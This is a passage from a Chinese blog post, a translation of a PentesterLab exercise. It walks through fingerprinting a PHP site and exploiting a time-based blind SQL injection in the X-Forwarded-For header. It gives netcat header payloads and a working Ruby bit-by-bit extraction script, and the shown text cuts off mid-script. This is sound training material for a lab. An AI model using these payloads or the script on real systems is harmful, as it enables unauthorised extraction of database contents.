@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>From SQL Injection to Shell II | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="Pentesterlab">
+    <meta name="description" content="简介本课程详细介绍一个基于PHP开发的网站的SQL盲注，以及攻击者如何利用它来访问管理页面。然后，使用该访问，攻击者能够通过配置问题获得服务器上的代码执行。   攻击分为3个步骤：    指纹识别：收集在Web应用使用的技术信息。   SQL注入检测和利用：在这一部分中，您将学习SQL盲注的原理以及如何利用它们来获取信息。   访问管理页面和代码执行：最后一步，你将访问操作系统并且运行代码。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="From SQL Injection to Shell II">
+<meta property="og:url" content="https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="简介本课程详细介绍一个基于PHP开发的网站的SQL盲注，以及攻击者如何利用它来访问管理页面。然后，使用该访问，攻击者能够通过配置问题获得服务器上的代码执行。   攻击分为3个步骤：    指纹识别：收集在Web应用使用的技术信息。   SQL注入检测和利用：在这一部分中，您将学习SQL盲注的原理以及如何利用它们来获取信息。   访问管理页面和代码执行：最后一步，你将访问操作系统并且运行代码。">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032001.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032002.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032003.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032004.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032005.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032006.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032007.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032008.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032009.png">
+<meta property="article:published_time" content="2015-03-20T06:28:26.000Z">
+<meta property="article:modified_time" content="2019-08-29T06:29:50.630Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="Pentesterlab">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032001.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                网恋选我我超甜
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">From SQL Injection to Shell II</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">From SQL Injection to Shell II</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2015-03-20T06:28:26.000Z" itemprop="datePublished" class="page-time">
+  2015-03-20
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#简介"><span class="post-toc-number">1.</span> <span class="post-toc-text">简介</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#指纹识别"><span class="post-toc-number">2.</span> <span class="post-toc-text">指纹识别</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#检查HTTP头部信息"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">检查HTTP头部信息</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入检测与利用"><span class="post-toc-number">3.</span> <span class="post-toc-text">SQL注入检测与利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SQL注入检测"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">SQL注入检测</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL盲注利用"><span class="post-toc-number">4.</span> <span class="post-toc-text">SQL盲注利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#手工利用"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">手工利用</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#使用SQLMap进行注入"><span class="post-toc-number">5.</span> <span class="post-toc-text">使用SQLMap进行注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#访问管理页面和代码执行"><span class="post-toc-number">6.</span> <span class="post-toc-text">访问管理页面和代码执行</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#上传WebShell并且执行代码"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">上传WebShell并且执行代码</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">7.</span> <span class="post-toc-text">总结</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-From-SQL-Injection-to-Shell-II"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">From SQL Injection to Shell II</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2015-03-20 14:28:26" datetime="2015-03-20T06:28:26.000Z"  itemprop="datePublished">2015-03-20</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本课程详细介绍一个基于PHP开发的网站的SQL盲注，以及攻击者如何利用它来访问管理页面。然后，使用该访问，攻击者能够通过配置问题获得服务器上的代码执行。  </p>
+<p>攻击分为3个步骤：  </p>
+<ol>
+<li>指纹识别：收集在Web应用使用的技术信息。  </li>
+<li>SQL注入检测和利用：在这一部分中，您将学习SQL盲注的原理以及如何利用它们来获取信息。  </li>
+<li>访问管理页面和代码执行：最后一步，你将访问操作系统并且运行代码。  </li>
+</ol>
+<p>如果你感到合适，你可以尝试发现和利用这些漏洞而不按照课程。你可以在之后回到课程来学习一些你可能没有想到的技巧。  </p>
+<p>一旦你访问Web应用程序，你将看到下面的页面：  </p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032001.png" alt=""></p>
+<h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><p>指纹识别可以通过使用多个工具。首先通过使用浏览器，将有可能检测到该应用程序是用PHP写的（通过文件扩展名）。  </p>
+<h2 id="检查HTTP头部信息"><a href="#检查HTTP头部信息" class="headerlink" title="检查HTTP头部信息"></a>检查HTTP头部信息</h2><p>大量的信息可以通过使用telnet或netcat连接到远程Web应用程序获取，我个人使用netcat，直接通过命令行使用效率更高：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"HEAD / HTTP/1.1\r\nHost: vulnerable\r\nConnection: close\r\n\r\n"</span> | netcat vulnerable 80</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/0.7.67</span><br><span class="line">Date: Wed, 29 May 2013 00:52:49 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/5.3.3-7+squeeze15</span><br></pre></td></tr></table></figure>
+
+<p>如果你使用 <code>bash</code> ，确保你添加<code>en</code>到命令行：<code>echo -en &quot;HEAD...</code>  </p>
+<p>我们可以看到，Web服务器使用Nginx并且PHP也被安装了。使用 <strong>HEAD</strong> 将使你得到所有页面的内容。使用 <strong>Connection: close</strong> 告诉服务器处理请求后关闭连接。这将确保命令马上返回。</p>
+<h1 id="SQL注入检测与利用"><a href="#SQL注入检测与利用" class="headerlink" title="SQL注入检测与利用"></a>SQL注入检测与利用</h1><h2 id="SQL注入检测"><a href="#SQL注入检测" class="headerlink" title="SQL注入检测"></a>SQL注入检测</h2><p>该网站提供的SQL注入要找到它有点棘手，尤其是如果你不知道去哪里找。首先，你需要知道SQL注入是盲目的。其次，你不能检测并触发它如果您使用的是浏览器（除了浏览器的扩展用来伪造HTTP流量）。你需要使用一个代理，一个工具（如netcat）或一些代码来找到它。  </p>
+<p>除了通常的“GPC”猜测：GET参数，POST参数和Cookies；还有其他的值可以用于发现漏洞：  </p>
+<ul>
+<li><strong>User-Agent</strong> 。  </li>
+<li><strong>Host</strong> 头。  </li>
+<li><strong>X-Forwarded-For</strong> 和 <strong>X-Forwarded-Host</strong> 头。  </li>
+<li>…</li>
+</ul>
+<p><strong>User-Agent</strong> 明显并且易于操作。<strong>Host</strong> 头有点难度，因为你将需要将主机头从传统的DNS解析中分离出来（（即：您无法直接用浏览器访问[http://‘+or+’1’=’1]/test.php](http://‘+or+’1’=’1]/test.php），因为DNS无法分辨出 <strong>‘+or+’1’=’1</strong>）。  </p>
+<p>注入到主机名，您需要发送您的请求，通过手动或代理在请求中修改 <strong>Host</strong> 头：  </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ' or '1'='1</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>最近，一些公布的漏洞入口点是<code>Host</code>头。一些存在漏洞的函数位于密码重置页面（发送链接是基于<code>Host</code>头）和数据页（页面显示<code>Host</code>的值，没有任何过滤 ）。  </p>
+<p>通常列表中最后一个是 <strong>X-Forwarded-For</strong> 头。<strong>X-Forwarded-For</strong> 是传统用来获取客户端的IP地址。你可能会问为什么PHP代码没有使用TCP连接中的IP地址（例如 <strong>$_SERVER[‘REMOTE_ADDR’]</strong> ）来代替这个头。<strong>X-Forwarded-For</strong> 主要用于当应用程序在一个反向代理之后。如果应用使用 <strong>$_SERVER[‘REMOTE_ADDR’]</strong> 所有请求看起来都是来自于反向代理代替客户（这将打破所有的审计和日志记录机制）。这就是为什么很多应用程序的设计类似于下面的代码：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">  $ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>X-Forwarded-For</strong> 仅在当应用程序运行在一个反向代理之后时设置，这种代码在大多数情况下工作。然而，这个代码假定攻击者不能伪造这个头。最后，因为开发者认为，IP地址将是一个有效的IPv4地址，他们往往没有进行足够的过滤。  </p>
+<p>利用这些信息，我们将看到我们如何使用基于时间的SQL盲注。这里的想法是注入一个需要花费很长时间来处理的函数并且观察是否调用该函数，通过观察网页载入的时间。  </p>
+<p>首先，我们可以很容易地使用命令行发送请求。然而，我们可以看到，发送的有效载荷：<br><strong>hacker</strong> ：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"GET / HTTP/1.0\r\nX-Forwarded-For: hacker\r\nConnection: close\r\n\r\n"</span> | netcat vulnerable 80</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>hacker’</strong> ：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"GET / HTTP/1.0\r\nX-Forwarded-For: hacker'\r\nConnection: close\r\n\r\n"</span> | netcat vulnerable 80</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>hacker’ or ‘1’=’1</strong> 。<br><strong>hacker’ and ‘1’=’1</strong> 。  </p>
+<p>将得到相同的结果，没有简单的方法来发现这个参数是否可以注入。</p>
+<p>幸运的是，我们可以使用基于时间的检测，通过检查时间差发现漏洞。我们可以看到这个有效载荷：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"GET / HTTP/1.0\r\nX-Forwarded-For: hacker' or sleep(4) and '1'='1\r\nConnection: close\r\n\r\n"</span> | netcat vulnerable 80</span></span><br></pre></td></tr></table></figure>
+
+<p>将比这一个花费更多的时间：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"GET / HTTP/1.0\r\nX-Forwarded-For: hacker' or sleep(0) and '1'='1\r\nConnection: close\r\n\r\n"</span> | netcat vulnerable 80</span></span><br></pre></td></tr></table></figure>
+
+<p>作为使用 <strong>‘1’=’1</strong> 结束语句的代替，你可以使用 <strong>#</strong> 。使用 <strong>–</strong> 注释掉之后的语句将不工作（用于检索header的函数将除去 <strong>–</strong> 之后的空格），除非你使用 <strong>– -</strong>来确保保留空格。  </p>
+<p>使用 <strong>and sleep…</strong> 代替 <strong>or sleep…</strong> 也很重要，MySQL不会执行 <strong>sleep()</strong> ，如果第一部分（匹配 <strong>ip</strong>）没有返回 <strong>true</strong> 。因为我们使用的 <strong>hacker</strong> （之前没有使用过），它将返回 <strong>false</strong> 并且 <strong>sleep…</strong> 会被执行。MySQL的确很聪明，不会测试：  </p>
+<ul>
+<li><strong>Y</strong> in <strong>X and Y</strong> if <strong>X</strong> returns <strong>false</strong>.</li>
+<li><strong>Y</strong> in <strong>X or Y</strong> if <strong>X</strong> returns <strong>right</strong>.</li>
+</ul>
+<p>你会经常需要到处闲逛以确保代码是很脆弱的，你不要让这种行为变化干扰到。  </p>
+<p>基于这种差异（之后多测试几次，以确保它不是由于连接的速度），我们可以肯定，这个网站很容易受到SQL注入。</p>
+<p>默认情况下，sqlmap并不会测试<code>X-Forwarded-For</code>头的SQL注入。你需要知道工具的局限性并且知道该从哪里开始。</p>
+<h1 id="SQL盲注利用"><a href="#SQL盲注利用" class="headerlink" title="SQL盲注利用"></a>SQL盲注利用</h1><h2 id="手工利用"><a href="#手工利用" class="headerlink" title="手工利用"></a>手工利用</h2><p>我们要利用传统的SQL盲注，我们有2种情况（true/slow 和 false/quick），基于此，我们可以检索信息。  </p>
+<p>首先，我们要使用 <strong>select @@version</strong> 检索一行。一旦我们知道如何去做，我们可以多行。  </p>
+<p>在这里我们要检索数据库的版本 <strong>select @@version</strong> 。为此，我们需要获取每个字符的每个字节，通过 <strong>select @@version</strong> 。  </p>
+<p>我们的版本是5.0.4，我们需要选择这个字符串的所有字符，通过使用MySQL函数 <strong>substring</strong> ：  </p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032002.png" alt=""></p>
+<p>既然我们知道如何提取每个字母（字节）；我们现在就需要提取每个字节的每一位。作为一个例子，让我们看看它如何能做到，以值 <strong>5</strong> 为例。首先我们需要得到的 <strong>5</strong> 的ASCII码值使用MySQL函数 *<em>ascii    *</em>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT ascii(&#39;5&#39;);</span><br><span class="line">+----------+</span><br><span class="line">| ascii(5) |</span><br><span class="line">+----------+</span><br><span class="line">|       53 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
+
+<p>现在，我们需要检索在每个位的值。<strong>53</strong> 可以代表的二进制值： <strong>00110101</strong> 。我们可以使用一个比特位分离出其他内容。分离和检索每一位之后，我们可以在攻击者这边重新构建这个值。  </p>
+<p>首先，我们需要基础boolean与（<strong>&amp;</strong>）怎么工作：  </p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032003.png" alt=""></p>
+<p>我们将使用这些属性来分离每个比特的信息。</p>
+<p>我们可以使用 <strong>&amp;1</strong> 分离第一位：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032004.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>返回值为第一位是1。此值将产生一个 <strong>true</strong> 的状态和响应将是缓慢的。</p>
+<p><strong>&amp;</strong> 用于分离，<strong>1</strong>用于指明第一位。作为一个说明：2 ^ 0等于1。</p>
+<p>我们可以使用 <strong>&amp;2</strong>来移动到第二位（2^1 等于 2）：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032005.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>返回值为第二位是0。0将产生一个 <strong>false</strong> 的状态并且响应会很快。</p>
+<p>我们可以继续移动到第三位通过 <strong>&amp;4</strong> （2^2 等于 4）：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032006.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>返回值为第三位1。4值将产生一个 <strong>true</strong> 的状态并且响应将被推迟。</p>
+<p>我们可以继续获取第一个字节的所有位。对于每一位，你将需要添加值（它的结果是true）作为一个变量。这个变量将包含最后的字节，当你检索所有位之后。</p>
+<p>我们可以把一切都在2个循环中，每一个字符和当前字符的每一位：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line"></span><br><span class="line">inj = <span class="string">"select @@version"</span></span><br><span class="line">str = <span class="string">""</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(sql)</span></span></span><br><span class="line">  p = <span class="string">"hacker' or if((<span class="subst">#&#123;sql&#125;</span>),sleep(0.5),0) and '1'='1"</span>  </span><br><span class="line">  t = Time.now</span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    s = TCPSocket.new(<span class="string">"vulnerable"</span>,<span class="number">80</span>)</span><br><span class="line">    s.write(<span class="string">"GET / HTTP/1.1\r\nHost: vulnerable\r\nX-Forwarded-For: <span class="subst">#&#123;p&#125;</span>\r\nConnection: close\r\n\r\n"</span>)</span><br><span class="line">    s.readlines()</span><br><span class="line">    s.close</span><br><span class="line">  <span class="keyword">rescue</span> Errno::ECONNRESET, EOFError</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> ((Time.now-t)&gt;<span class="number">0</span>.<span class="number">5</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dummy initialisation for the while loop</span></span><br><span class="line"><span class="comment"># we loop until the returned value is null</span></span><br><span class="line">value = <span class="number">1</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> value != <span class="number">0</span></span><br><span class="line">  <span class="comment"># i is the position in the string</span></span><br><span class="line">  i+=<span class="number">1</span></span><br><span class="line">  <span class="comment"># initialise to 0 the value we are trying to retrieve</span></span><br><span class="line">  value = <span class="number">0</span></span><br><span class="line">  <span class="comment"># for each bit</span></span><br><span class="line">  <span class="number">0</span>.upto(<span class="number">6</span>) <span class="keyword">do</span> <span class="params">|bit|</span></span><br><span class="line">    <span class="comment"># 2**bit is 2^bit and will do all the bit masking work</span></span><br><span class="line">    sql = <span class="string">"select ascii(substring((<span class="subst">#&#123;inj&#125;</span>),<span class="subst">#&#123;i&#125;</span>,1))&amp;<span class="subst">#&#123;<span class="number">2</span>**bit&#125;</span>"</span></span><br><span class="line">    <span class="keyword">if</span> test(sql)</span><br><span class="line">      <span class="comment"># if the returned value is true</span></span><br><span class="line">      <span class="comment"># we add the mask to the current_value</span></span><br><span class="line">      value+=<span class="number">2</span>**bit</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="comment"># value is an ascii value, we get the corresponding character</span></span><br><span class="line">  <span class="comment"># using the `.chr` ruby function</span></span><br><span class="line">  str+= value.chr</span><br><span class="line">  puts str</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>你可以通过检索每个结果的大小在开始之前完善这个脚本。停在一个<strong><code>NULL</code></strong>值，不可能正常工作的二进制位置。  </p>
+<p>现在我们已经有了脚本来检索单行。我们需要改进，使它能够处理多行，可以获取所有的用户。</p>
+<p>但首先，让我们看看用户是如何连接数据库，看是否能找到一条捷径去执行代码。了解使用的用户，我们只需要替换我们的有效载荷：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inj = <span class="string">"select user()"</span></span><br></pre></td></tr></table></figure>
+
+<p>然后运行我们的脚本获取结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ruby course/exploit.rb</span></span><br><span class="line">p</span><br><span class="line">pe</span><br><span class="line">pen</span><br><span class="line">pent</span><br><span class="line">pente</span><br><span class="line">pentes</span><br><span class="line">pentest</span><br><span class="line">penteste</span><br><span class="line">[...]</span><br><span class="line">pentesterlab@localhost</span><br></pre></td></tr></table></figure>
+
+<p>这个用户看起来并没有 <strong>FILE</strong> 权限。在另一项练习，我们将看到我们如何检查并且得得它的代码执行。</p>
+<p>要获取多个行，我们只需要添加另一个循环到脚本中，每次检索一行。我们可以分离每一行行通过使用SQL关键字 <strong>LIMIT</strong> 。下表说明了 <strong>LIMIT</strong> 行为：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032007.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032008.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
+<p>注：<strong>as id</strong> 只是用来使MySQL输出更容易阅读。</p>
+<p>现在我们知道了如何分离每一行。我们可以通过循环每一行获取所有的结果。<br>我们只需要：  </p>
+<ul>
+<li>添加一个 <strong>index</strong> 循环（我们只想要前10个结果）。  </li>
+<li>在我们的载荷中使用 <strong>index</strong> 来限制结果的数量。  </li>
+<li>在获取新行之前重置变量 <strong>value</strong> ，<strong>i</strong> 和 <strong>str</strong> 。  </li>
+</ul>
+<p>修改后的代码：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> index &lt; <span class="number">10</span></span><br><span class="line">  <span class="comment"># using a new variable for the new payload to keep things simple</span></span><br><span class="line">  newinj = inj + <span class="string">" limit <span class="subst">#&#123;index&#125;</span>,1"</span></span><br><span class="line">  i = <span class="number">0</span></span><br><span class="line">  str =<span class="string">""</span></span><br><span class="line">  value = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> value != <span class="number">0</span></span><br><span class="line">    [...]</span><br><span class="line">    <span class="number">0</span>.upto(<span class="number">6</span>) <span class="keyword">do</span> 